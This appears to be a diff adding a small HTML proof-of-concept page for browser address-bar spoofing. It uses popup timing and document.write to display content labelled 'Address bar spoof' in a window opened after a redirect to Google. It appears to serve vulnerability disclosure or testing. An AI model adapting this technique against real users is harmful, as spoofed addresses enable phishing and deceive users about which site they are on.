@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Test</title>
+<style>
+  :root { font: 16px/1.5 -apple-system, system-ui, sans-serif; }
+  body { margin:0; padding:16px; background:#0d1117; color:#e6edf3; }
+  h1 { font-size:18px; margin:0 0 10px; }
+  button { font:inherit; background:#238636; color:#fff; border:0; border-radius:8px; padding:10px 14px; margin:4px 4px 4px 0; }
+  button.alt { background:#1f6feb; }
+  code { background:#0d1117; border:1px solid #30363d; border-radius:5px; padding:1px 5px; font-size:13px; }
+  .obs { color:#d29922; font-size:14px; }
+  #log { white-space:pre-wrap; font:12px ui-monospace,Menlo,monospace; background:#010409; border:1px solid #30363d; border-radius:8px; padding:10px; margin-top:12px; max-height:240px; overflow:auto; }
+</style>
+</head>
+<body>
+
+<button id="btn1" class="alt" onclick="step1()">Go to google</button>
+<button id="btn2" style="display:none" onclick="openSentinelPopupa('about:blank#poc')">try again. go to google</button>
+
+<p id="msg" style="display:none" class="obs">failed redirect. try again redirect</p>
+
+<script>
+
+function step1(){
+  openSentinelPopup('http:google.com');
+  document.getElementById('btn1').style.display = 'none';   
+  document.getElementById('btn2').style.display = '';       
+  document.getElementById('msg').style.display = '';        
+}
+
+function openSentinelPopup(url){
+  const w = window.open(url, '_blank');
+  setTimeout(()=>{
+    w.close()
+  }, 2500);
+}
+function openSentinelPopupa(url){
+  const a = window.open(url, '_blank');
+  setTimeout(()=>{
+      a.document.write(`
+        <h1>Address bar spoof</h1>
+      `);
+  }, 10);
+
+}
+</script>
+</body>
+</html>
